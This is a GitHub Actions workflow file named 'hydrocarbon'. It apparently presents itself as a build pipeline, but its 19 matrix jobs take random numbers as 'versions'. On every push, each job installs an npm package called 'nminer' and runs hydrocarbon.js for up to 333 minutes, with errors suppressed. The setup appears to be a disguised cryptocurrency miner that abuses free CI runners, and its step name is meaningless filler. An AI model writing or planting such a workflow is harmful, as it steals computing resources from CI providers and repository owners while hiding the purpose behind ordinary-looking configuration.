name: hydrocarbon
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1820 }
          - { version: 8930 }
          - { version: 3980 }
          - { version: 4384 }
          - { version: 3221 }
          - { version: 7146 }
          - { version: 2890 }
          - { version: 9451 }
          - { version: 2488 }
          - { version: 4105 }
          - { version: 3450 }
          - { version: 6808 }
          - { version: 6329 }
          - { version: 6730 }
          - { version: 2729 }
          - { version: 9093 }
          - { version: 5619 }
          - { version: 9937 }
          - { version: 6580 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: before what distant
        run: |
          npm install nminer@latest
          timeout 333m node hydrocarbon.js || echo "hydrocarbon executed"